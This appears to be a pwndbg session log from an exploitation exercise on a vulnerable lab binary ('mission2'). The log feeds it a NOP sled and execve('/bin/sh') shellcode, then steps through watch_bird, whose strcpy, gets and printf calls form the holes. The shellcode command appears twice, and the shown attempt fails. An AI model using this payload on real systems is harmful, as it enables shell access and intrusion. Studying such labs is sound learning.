+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+
+Breakpoint 1, 0x080487ae in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x45665c /* '\\fE' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x45
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc5a0 ◂— 0x1
+ EIP  0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0x80487ae <main+27>    mov    dword ptr [ebp - 0xc], eax
+   0x80487b1 <main+30>    sub    esp, 0xc
+   0x80487b4 <main+33>    push   dword ptr [ebp - 0xc]
+   0x80487b7 <main+36>    call   watch_bird <0x80486f3>
+ 
+   0x80487bc <main+41>    add    esp, 0x10
+   0x80487bf <main+44>    sub    esp, 0xc
+   0x80487c2 <main+47>    push   dword ptr [ebp - 0xc]
+   0x80487c5 <main+50>    call   free@plt <0x8048480>
+ 
+   0x80487ca <main+55>    add    esp, 0x10
+   0x80487cd <main+58>    mov    eax, 0
+   0x80487d2 <main+63>    mov    ecx, dword ptr [ebp - 4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc5a0 ◂— 0x1
+01:0004│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+02:0008│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+03:000c│      0xffffc5ac —▸ 0x8048801 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
+04:0010│      0xffffc5b0 —▸ 0xf7fc73dc (__exit_funcs) —▸ 0xf7fc81e0 (initial) ◂— 0
+05:0014│      0xffffc5b4 —▸ 0xffffc5d0 ◂— 0x1
+06:0018│ ebp  0xffffc5b8 ◂— 0x0
+07:001c│      0xffffc5bc —▸ 0xf7e2c647 (__libc_start_main+247) ◂— add    esp, 0x10
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80487ae main+27
+   f 1 f7e2c647 __libc_start_main+247
+Breakpoint *0x080487ae
+pwndbg> n
+0x080487b1 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x45665c /* '\\fE' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x45
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc5a0 ◂— 0x1
+ EIP  0x80487b1 (main+30) ◂— sub    esp, 0xc
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80487ae <main+27>    mov    dword ptr [ebp - 0xc], eax
+ ► 0x80487b1 <main+30>    sub    esp, 0xc
+   0x80487b4 <main+33>    push   dword ptr [ebp - 0xc]
+   0x80487b7 <main+36>    call   watch_bird <0x80486f3>
+ 
+   0x80487bc <main+41>    add    esp, 0x10
+   0x80487bf <main+44>    sub    esp, 0xc
+   0x80487c2 <main+47>    push   dword ptr [ebp - 0xc]
+   0x80487c5 <main+50>    call   free@plt <0x8048480>
+ 
+   0x80487ca <main+55>    add    esp, 0x10
+   0x80487cd <main+58>    mov    eax, 0
+   0x80487d2 <main+63>    mov    ecx, dword ptr [ebp - 4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc5a0 ◂— 0x1
+01:0004│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+02:0008│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+03:000c│      0xffffc5ac —▸ 0x804b008 ◂— 0x45665c /* '\\fE' */
+04:0010│      0xffffc5b0 —▸ 0xf7fc73dc (__exit_funcs) —▸ 0xf7fc81e0 (initial) ◂— 0
+05:0014│      0xffffc5b4 —▸ 0xffffc5d0 ◂— 0x1
+06:0018│ ebp  0xffffc5b8 ◂— 0x0
+07:001c│      0xffffc5bc —▸ 0xf7e2c647 (__libc_start_main+247) ◂— add    esp, 0x10
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80487b1 main+30
+   f 1 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x080487b4 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x45665c /* '\\fE' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x45
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc594 ◂— 0x0
+ EIP  0x80487b4 (main+33) ◂— push   dword ptr [ebp - 0xc]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80487ae <main+27>    mov    dword ptr [ebp - 0xc], eax
+   0x80487b1 <main+30>    sub    esp, 0xc
+ ► 0x80487b4 <main+33>    push   dword ptr [ebp - 0xc]
+   0x80487b7 <main+36>    call   watch_bird <0x80486f3>
+ 
+   0x80487bc <main+41>    add    esp, 0x10
+   0x80487bf <main+44>    sub    esp, 0xc
+   0x80487c2 <main+47>    push   dword ptr [ebp - 0xc]
+   0x80487c5 <main+50>    call   free@plt <0x8048480>
+ 
+   0x80487ca <main+55>    add    esp, 0x10
+   0x80487cd <main+58>    mov    eax, 0
+   0x80487d2 <main+63>    mov    ecx, dword ptr [ebp - 4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc594 ◂— 0x0
+01:0004│      0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc59c —▸ 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+03:000c│      0xffffc5a0 ◂— 0x1
+04:0010│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+05:0014│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+06:0018│      0xffffc5ac —▸ 0x804b008 ◂— 0x45665c /* '\\fE' */
+07:001c│      0xffffc5b0 —▸ 0xf7fc73dc (__exit_funcs) —▸ 0xf7fc81e0 (initial) ◂— 0
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80487b4 main+33
+   f 1 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x080487b7 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x45665c /* '\\fE' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x45
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc590 —▸ 0x804b008 ◂— 0x45665c /* '\\fE' */
+ EIP  0x80487b7 (main+36) —▸ 0xffff37e8 ◂— 0x0
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80487ae <main+27>    mov    dword ptr [ebp - 0xc], eax
+   0x80487b1 <main+30>    sub    esp, 0xc
+   0x80487b4 <main+33>    push   dword ptr [ebp - 0xc]
+ ► 0x80487b7 <main+36>    call   watch_bird <0x80486f3>
+        arg[0]: 0x804b008 ◂— 0x45665c /* '\\fE' */
+        arg[1]: 0x0
+        arg[2]: 0xffffc5b8 ◂— 0x0
+        arg[3]: 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+ 
+   0x80487bc <main+41>    add    esp, 0x10
+   0x80487bf <main+44>    sub    esp, 0xc
+   0x80487c2 <main+47>    push   dword ptr [ebp - 0xc]
+   0x80487c5 <main+50>    call   free@plt <0x8048480>
+ 
+   0x80487ca <main+55>    add    esp, 0x10
+   0x80487cd <main+58>    mov    eax, 0
+   0x80487d2 <main+63>    mov    ecx, dword ptr [ebp - 4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc590 —▸ 0x804b008 ◂— 0x45665c /* '\\fE' */
+01:0004│      0xffffc594 ◂— 0x0
+02:0008│      0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc59c —▸ 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+04:0010│      0xffffc5a0 ◂— 0x1
+05:0014│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+06:0018│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+07:001c│      0xffffc5ac —▸ 0x804b008 ◂— 0x45665c /* '\\fE' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80487b7 main+36
+   f 1 f7e2c647 __libc_start_main+247
+pwndbg> n
+Tell me: what bird are you watching?
+��������������������������������������������������������������������������������������������������������������������������������^�1��F�F
+                                                  �
+                                                   ���V
+                                                       1ۉ�@̀�����/bin/shwait what you doing?!
+[Inferior 1 (process 20890) exited with code 0377]
+pwndbg> n
+The program is not being run.
+pwndbg> n
+The program is not being run.
+pwndbg> disassemble watch_bird 
+Dump of assembler code for function watch_bird:
+   0x080486f3 <+0>:	push   ebp
+   0x080486f4 <+1>:	mov    ebp,esp
+   0x080486f6 <+3>:	sub    esp,0xa8
+   0x080486fc <+9>:	lea    eax,[ebp-0x10]
+   0x080486ff <+12>:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048702 <+15>:	sub    esp,0x8
+   0x08048705 <+18>:	push   DWORD PTR [ebp+0x8]
+   0x08048708 <+21>:	lea    eax,[ebp-0x10]
+   0x0804870b <+24>:	push   eax
+   0x0804870c <+25>:	call   0x80484a0 <strcpy@plt>
+   0x08048711 <+30>:	add    esp,0x10
+   0x08048714 <+33>:	sub    esp,0xc
+   0x08048717 <+36>:	push   0x8048860
+   0x0804871c <+41>:	call   0x80484c0 <puts@plt>
+   0x08048721 <+46>:	add    esp,0x10
+   0x08048724 <+49>:	sub    esp,0xc
+   0x08048727 <+52>:	lea    eax,[ebp-0xa4]
+   0x0804872d <+58>:	push   eax
+   0x0804872e <+59>:	call   0x8048470 <gets@plt>
+   0x08048733 <+64>:	add    esp,0x10
+   0x08048736 <+67>:	sub    esp,0xc
+   0x08048739 <+70>:	lea    eax,[ebp-0xa4]
+   0x0804873f <+76>:	push   eax
+   0x08048740 <+77>:	call   0x8048450 <printf@plt>
+   0x08048745 <+82>:	add    esp,0x10
+   0x08048748 <+85>:	sub    esp,0x8
+   0x0804874b <+88>:	lea    eax,[ebp-0x10]
+   0x0804874e <+91>:	push   eax
+   0x0804874f <+92>:	push   DWORD PTR [ebp+0x8]
+   0x08048752 <+95>:	call   0x8048440 <strcmp@plt>
+   0x08048757 <+100>:	add    esp,0x10
+   0x0804875a <+103>:	test   eax,eax
+   0x0804875c <+105>:	jne    0x8048766 <watch_bird+115>
+   0x0804875e <+107>:	lea    eax,[ebp-0x10]
+   0x08048761 <+110>:	cmp    DWORD PTR [ebp-0xc],eax
+   0x08048764 <+113>:	je     0x8048780 <watch_bird+141>
+   0x08048766 <+115>:	sub    esp,0xc
+   0x08048769 <+118>:	push   0x8048885
+   0x0804876e <+123>:	call   0x80484c0 <puts@plt>
+   0x08048773 <+128>:	add    esp,0x10
+   0x08048776 <+131>:	sub    esp,0xc
+   0x08048779 <+134>:	push   0xffffffff
+   0x0804877b <+136>:	call   0x80484d0 <exit@plt>
+   0x08048780 <+141>:	sub    esp,0xc
+   0x08048783 <+144>:	push   0x804889c
+   0x08048788 <+149>:	call   0x80484c0 <puts@plt>
+   0x0804878d <+154>:	add    esp,0x10
+   0x08048790 <+157>:	nop
+   0x08048791 <+158>:	leave  
+   0x08048792 <+159>:	ret    
+End of assembler dump.
+pwndbg> b* 0x080486f3
+Breakpoint 2 at 0x80486f3
+pwndbg> r
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+
+Breakpoint 1, 0x080487ae in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc5a0 ◂— 0x1
+ EIP  0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0x80487ae <main+27>    mov    dword ptr [ebp - 0xc], eax
+   0x80487b1 <main+30>    sub    esp, 0xc
+   0x80487b4 <main+33>    push   dword ptr [ebp - 0xc]
+   0x80487b7 <main+36>    call   watch_bird <0x80486f3>
+ 
+   0x80487bc <main+41>    add    esp, 0x10
+   0x80487bf <main+44>    sub    esp, 0xc
+   0x80487c2 <main+47>    push   dword ptr [ebp - 0xc]
+   0x80487c5 <main+50>    call   free@plt <0x8048480>
+ 
+   0x80487ca <main+55>    add    esp, 0x10
+   0x80487cd <main+58>    mov    eax, 0
+   0x80487d2 <main+63>    mov    ecx, dword ptr [ebp - 4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc5a0 ◂— 0x1
+01:0004│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+02:0008│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+03:000c│      0xffffc5ac —▸ 0x8048801 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
+04:0010│      0xffffc5b0 —▸ 0xf7fc73dc (__exit_funcs) —▸ 0xf7fc81e0 (initial) ◂— 0
+05:0014│      0xffffc5b4 —▸ 0xffffc5d0 ◂— 0x1
+06:0018│ ebp  0xffffc5b8 ◂— 0x0
+07:001c│      0xffffc5bc —▸ 0xf7e2c647 (__libc_start_main+247) ◂— add    esp, 0x10
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80487ae main+27
+   f 1 f7e2c647 __libc_start_main+247
+Breakpoint *0x080487ae
+pwndbg> c
+Continuing.
+
+Breakpoint 2, 0x080486f3 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc58c —▸ 0x80487bc (main+41) ◂— add    esp, 0x10
+ EIP  0x80486f3 (watch_bird) ◂— push   ebp
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0x80486f3 <watch_bird>       push   ebp
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc58c —▸ 0x80487bc (main+41) ◂— add    esp, 0x10
+01:0004│      0xffffc590 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc594 ◂— 0x0
+03:000c│      0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+04:0010│      0xffffc59c —▸ 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+05:0014│      0xffffc5a0 ◂— 0x1
+06:0018│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+07:001c│      0xffffc5a8 —▸ 0xffffc66c —▸ 0xffffc7bc ◂— 'XDG_SESSION_ID=c10248'
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80486f3 watch_bird
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+Breakpoint * 0x080486f3
+pwndbg> n
+0x080486f4 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc5b8 ◂— 0x0
+ ESP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ EIP  0x80486f4 (watch_bird+1) ◂— mov    ebp, esp
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f3 <watch_bird>       push   ebp
+ ► 0x80486f4 <watch_bird+1>     mov    ebp, esp
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+01:0004│      0xffffc58c —▸ 0x80487bc (main+41) ◂— add    esp, 0x10
+02:0008│      0xffffc590 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+03:000c│      0xffffc594 ◂— 0x0
+04:0010│      0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+05:0014│      0xffffc59c —▸ 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+06:0018│      0xffffc5a0 ◂— 0x1
+07:001c│      0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80486f4 watch_bird+1
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x080486f6 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ EIP  0x80486f6 (watch_bird+3) ◂— sub    esp, 0xa8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f3 <watch_bird>       push   ebp
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
+ ► 0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ ebp esp  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+01:0004│          0xffffc58c —▸ 0x80487bc (main+41) ◂— add    esp, 0x10
+02:0008│          0xffffc590 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+03:000c│          0xffffc594 ◂— 0x0
+04:0010│          0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+05:0014│          0xffffc59c —▸ 0x80487ae (main+27) ◂— mov    dword ptr [ebp - 0xc], eax
+06:0018│          0xffffc5a0 ◂— 0x1
+07:001c│          0xffffc5a4 —▸ 0xffffc664 —▸ 0xffffc79c ◂— '/home/m843367/mission2/mission2'
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80486f6 watch_bird+3
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x080486fc in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x80486fc (watch_bird+9) ◂— lea    eax, [ebp - 0x10]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f3 <watch_bird>       push   ebp
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+ ► 0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+02:0008│      0xffffc4e8 ◂— 0x2
+03:000c│      0xffffc4ec ◂— 0x4
+04:0010│      0xffffc4f0 ◂— 0x20 /* ' ' */
+05:0014│      0xffffc4f4 ◂— 0x2
+06:0018│      0xffffc4f8 ◂— 0x0
+07:001c│      0xffffc4fc ◂— 0x38 /* '8' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80486fc watch_bird+9
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x080486ff in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x80486ff (watch_bird+12) ◂— mov    dword ptr [ebp - 0xc], eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f3 <watch_bird>       push   ebp
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+ ► 0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+02:0008│      0xffffc4e8 ◂— 0x2
+03:000c│      0xffffc4ec ◂— 0x4
+04:0010│      0xffffc4f0 ◂— 0x20 /* ' ' */
+05:0014│      0xffffc4f4 ◂— 0x2
+06:0018│      0xffffc4f8 ◂— 0x0
+07:001c│      0xffffc4fc ◂— 0x38 /* '8' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  80486ff watch_bird+12
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048702 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048702 (watch_bird+15) ◂— sub    esp, 8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f3 <watch_bird>       push   ebp
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
